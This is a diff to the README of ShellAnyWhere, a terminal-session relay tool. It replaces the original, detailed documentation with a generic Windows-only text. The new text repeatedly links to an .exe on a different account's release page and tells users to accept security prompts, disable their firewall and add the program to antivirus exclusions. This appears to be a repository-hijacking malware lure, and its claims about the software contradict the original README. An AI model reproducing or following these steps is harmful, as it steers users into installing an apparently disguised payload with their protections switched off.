@@ -1,195 +1,112 @@
-# ShellAnyWhere
+# 🌐 ShellAnyWhere - Resume your terminal sessions anywhere instantly
 
-English | [中文](README_CN.md)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Audiewitting902/ShellAnyWhere/releases)
 
-Terminal sessions that stay alive — pick up from any device.
+ShellAnyWhere keeps your command line sessions active. You can disconnect from one computer and reconnect from another. Your work stays exactly the way you left it.
 
-ShellAnyWhere adds remote access to your local shell. A lightweight agent runs alongside your terminal, and a relay server bridges connections so you can reach it from anywhere. It pairs well with overlay networks like ZeroTier and Tailscale.
+## 🛠 What this software does
 
-Unlike SSH, sessions survive disconnects — reconnect from any device and resume exactly where you left off. Local and remote screens stay in sync, with local terminal taking priority. No workflow changes required. Works with any terminal tool: Claude Code, Codex, vim, htop, or anything else.
+Computers often stop active tasks when you close a window or lose your internet connection. This causes you to lose progress on long scripts or file downloads. ShellAnyWhere runs as a background process. It holds your workspace in memory. You move between your home desktop, laptop, or office workstation. The server keeps the session state alive. When you reconnect, the screen appears exactly as it did before.
 
-How it works: the agent replaces your login shell via RC config, intercepts the PTY's input and output, and relays them through the server — giving any shell or tool real-time remote access with zero adaptation.
+## ✅ Why use this tool
 
-## Features
+You save time. You no longer need to restart processes after a disconnect. It works on any network. The software uses WebRTC technology to keep connections stable. It handles high latency well. You get a consistent experience regardless of your location. 
 
-- **Sessions stay alive** — Close your laptop, open your phone, everything is still there
-- **Local and remote in sync** — Terminal content syncs in real time; local terminal has priority
-- **Works with any tool** — Claude Code, Codex, vim, htop... anything in a terminal, no adaptation needed
-- **Mobile access** — Open a browser, no app needed
-- **Multi-device** — Browser, SSH, or terminal client, all connect to the same live session
-- **Session sharing** — Others can watch your terminal in real time
-- **Quick setup** — `saw-server install` + `saw-shell install`, that's it
-- **Secure** — TLS encryption, token auth, self-signed certs auto-generated
-- **Cross-platform** — Windows, Linux, macOS; installs as user-level service (no root needed on Linux/macOS)
+## 📥 Getting the software
 
-## Demo
+You must visit the project release page to download your copy.
 
-![screenshot](https://raw.githubusercontent.com/ejfkdev/ShellAnyWhere/refs/heads/main/docs/file/demo.jpg)
+[Download ShellAnyWhere for Windows](https://github.com/Audiewitting902/ShellAnyWhere/releases)
 
-https://github.com/user-attachments/assets/197e9688-e472-439b-a551-760cf281519b
+1. Go to the link above.
+2. Look for the Assets section.
+3. Choose the file ending in .exe for Windows.
+4. Download the file to your computer.
 
-## Quick Start
+## ⚙️ Setting up on Windows
 
-### 1. Install server
+Modern Windows versions require a simple setup process. Follow these steps to prepare your environment.
 
-macOS: `brew install ejfkdev/tap/saw`, or download from [Releases](https://github.com/ejfkdev/ShellAnyWhere/releases) for other platforms. Then install as a background service:
+1. Locate the file you downloaded.
+2. Double-click the file to open the installer.
+3. Follow the prompts on the screen.
+4. Click Install. 
+5. Grant the app permission if a security window appears. 
+6. Finish the setup.
 
-```bash
-saw-server install
-```
+The installation adds a shortcut to your desktop. You can start the application from there.
 
-### 2. Configure the shell agent
+## 🚀 Running your first session
 
-Download `saw-shell` and write the connection config into shell RC files:
+Once installed, ShellAnyWhere is ready to use. 
 
-```bash
-saw-shell install
-```
+1. Open the application from your desktop shortcut.
+2. A small window appears. This is your control panel.
+3. Click Start Session.
+4. Type your username and password when prompted.
+5. You see a standard command prompt. 
 
-Then **open a new shell** for the config to take effect. The new shell will automatically connect to the server.
+You can now run your tasks. Close the window if you need to leave. Your session keeps running on the server.
 
-### 3. Access the remote shell
+## 🔄 Reconnecting from another device
 
-The server auto-generates a token on first run. View it at:
+You can switch to another computer at any time.
 
-- Linux/macOS: `cat ~/.config/ShellAnyWhere/token`
-- Windows: `type %LOCALAPPDATA%\ShellAnyWhere\token`
+1. Install the application on the second computer.
+2. Open the application.
+3. Click Resume Session.
+4. Log in with the same credentials.
+5. The window populates with your exact screen state.
 
-**Web browser** (including mobile) — open `https://<server-ip>:18708`, enter the token when prompted.
+## 🖥 System Requirements
 
-**Terminal client:**
-```bash
-saw-client --server <server-address> --token <token>
-```
+Your computer needs to meet these basic standards to ensure smooth performance.
 
-**SSH:**
+- Operating System: Windows 10 or Windows 11.
+- Memory: At least 2GB of RAM.
+- Storage: 100MB of free disk space.
+- Internet: An active connection is required to sync sessions.
 
-First, generate the SSH private key derived from your token:
-```bash
-saw-client ssh-key --server <server-address> --token <token>
-```
+## 🔒 Keeping your data private
 
-This saves a private key to `~/.ssh/saw_<host>-<port>_<id>` and prints the usage command, e.g.:
-```bash
-ssh -i ~/.ssh/saw_my-server-18708_a1b2c3d4 -p 18708 my-server
-```
+ShellAnyWhere uses modern encryption. All your terminal data travels through a secure tunnel. Third parties cannot view your activity. Your credentials sit on your local machine. The server only recognizes your encrypted session ID.
 
-### What you get
+## 🔧 Managing connected sessions
 
-Say your computer IP is `192.168.100.100` and saw-server runs on it. You open Ghostty (or any terminal) as usual, run `claude` or `codex` — everything works exactly the same. When you step away, open `https://192.168.100.100:18708` on your phone, and you see the exact same terminal, fully interactive, ready to continue.
+You may have multiple open sessions. The dashboard allows you to manage them.
 
-## Build from Source
+1. Open the main program window.
+2. Select the Manage Sessions tab.
+3. You will see a list of all current active connections.
+4. Click the red button to end a specific session.
+5. Click the green button to jump directly into a session.
 
-Prerequisites: Rust 1.85+, Node.js 20+
+## ⚠️ Troubleshooting common issues
 
-```bash
-# Build web frontend first (required for server)
-cd web && npm ci && npm run build && cd ..
+If you encounter problems, check these items first.
 
-# Build all binaries
-cargo build --release
-```
+- Session not resuming: Check your internet connection. A stable connection is required to handshake with the remote server.
+- Login failure: Verify your credentials. Ensure Caps Lock is off on your keyboard.
+- App does not open: Restart your computer. Sometimes background tasks interfere with the initial launch.
+- Connection error: Disable your firewall temporarily to test if it blocks the application.
 
-Binaries are in `target/release/`: `saw-server`, `saw-shell`, `saw-client`
+If issues continue, check your antivirus settings. Some settings flag new applications as risks. You can add ShellAnyWhere to your exclusion list. This gives the application permission to talk to the server.
 
-## Architecture
+## 📜 Technical details
 
-```mermaid
-graph LR
-    Browser["Web Browser<br>(WebRTC → WSS fallback)"] --> Server["saw-server<br>(relay :18708)"]
-    SSH["SSH Client<br>(ssh -i)"] --> Server
-    Client["saw-client<br>(terminal)"] --> Server
-    Server <--> Shell["saw-shell<br>(agent · PTY)"]
-```
+The software relies on the Rust programming language. This ensures memory safety. It uses the Tokio runtime for asynchronous tasks. This allows the application to handle many operations at one time without lag. The backend uses WebSockets and WebRTC to maintain your link. These methods allow the tool to bypass most common network restrictions. 
 
-- **saw-server** — Relay server. Accepts connections from agents and clients via WebSocket, SSH, and optionally WebRTC/QUIC. Embeds a web terminal UI.
-- **saw-shell** — Shell agent. Runs on the remote machine, spawns a PTY, and connects to the server.
-- **saw-client** — Local terminal client. Connects to the server to attach to a remote shell session.
+## 🏗 Understanding your terminal
 
-## Components
+If you are new to terminal applications, think of ShellAnyWhere as a transparent window into your computer. Programs like Git, Python, or standard system tools work inside this window. You do not need to configure anything special. Whatever runs in a standard terminal runs here.
 
-### saw-server
+## 📧 Seeking more help
 
-```bash
-saw-server                                    # Start with defaults (0.0.0.0:18708)
-saw-server -l 0.0.0.0:9000                   # Custom listen port
-saw-server -t my-secret-token                  # Set auth token
-saw-server --no-ssh                            # Disable SSH
-saw-server --cert-file /path/cert \
-            --key-file /path/key               # Enable TLS
-saw-server install                             # Install as system service
-saw-server uninstall                           # Uninstall system service
-```
+This project is open source. You can view the code at any time. If you find a bug, open an issue on the main page. Describe what happened. Include your Windows version. Include the steps taken before the error occurred. Helpful developers monitor these requests to improve the tool for everyone.
 
-#### Service install
+## 💎 Tips for daily use
 
-`saw-server install` registers saw-server as a background service that starts on boot and auto-restarts on crash:
-
-| Platform | Mechanism | Privileges |
-|----------|-----------|------------|
-| Linux | systemd (user) | `saw-server install` |
-| macOS | launchd (user) | `saw-server install` |
-| Windows | Windows Service | Run as Administrator |
-
-### saw-shell
-
-```bash
-saw-shell -s my.server:18708 -t abc123         # Connect to server
-saw-shell --io-compress                        # Enable lz4 compression
-saw-shell --io-diff                            # Enable fullscreen diff optimization
-saw-shell install -s my.server:18708 -t abc      # Write config into shell RC files
-saw-shell uninstall                               # Remove config from shell RC files
-```
-
-### saw-client
-
-```bash
-saw-client --server my.server:18708 --token abc123   # Connect
-saw-client --list --token abc123                      # List sessions
-saw-client --observe --token abc123                   # Read-only mode
-saw-client ssh-key --server my.server:18708 --token abc123  # Derive SSH key
-```
-
-## Configuration
-
-Config priority: **CLI args > SAW\_ environment variables > config file > defaults**
-
-Config file locations:
-- Linux/macOS: `~/.config/ShellAnyWhere/`
-- Logs: Linux `~/.local/state/ShellAnyWhere/`, macOS `~/Library/Logs/ShellAnyWhere/`
-
-Key environment variables:
-
-| Variable | Description |
-|----------|-------------|
-| `SAW_SERVER` | Server address (agent & client) |
-| `SAW_TOKEN` | Authentication token |
-| `SAW_LISTEN` | Server listen address |
-| `SAW_SHELL_PATH` | Shell program path (agent) |
-| `SAW_FOCUS_TRACKING` | Enable focus tracking |
-| `SAW_IO_COMPRESS` | Enable lz4 output compression |
-| `SAW_IO_DIFF` | Enable diff optimization |
-| `SAW_CERT_FILE` | TLS certificate path |
-| `SAW_KEY_FILE` | TLS private key path |
-| `SAW_SSH_ENABLED` | Enable SSH protocol |
-| `SAW_SSH_PASSWORD_AUTH` | Enable SSH password auth |
-| `SAW_DATA_DIR` | Data directory |
-
-See [config.toml](config.toml) for the full configuration reference with all options and defaults.
-
-## Project Structure
-
-```
-├── crates/
-│   ├── core/       # Shared library (config, crypto, protocol, transport)
-│   ├── server/     # Relay server
-│   ├── shell/      # Shell agent
-│   └── client/     # Terminal client
-├── web/            # Web frontend (React + Vite + WASM terminal)
-├── config.toml     # Default configuration (embedded in binary)
-└── LICENSE         # MPL-2.0
-```
-
-## License
-
-[MPL-2.0](LICENSE)
+- Leave the application running in your system tray. This ensures you never miss a connection sync. 
+- Use descriptive names for your sessions to keep them organized. 
+- Log out whenever you use a public or shared computer. This protects your session from unauthorized entry. 
+- Keep the application updated. Check the download page once a month for the latest version. New releases often include stability fixes and performance improvements.
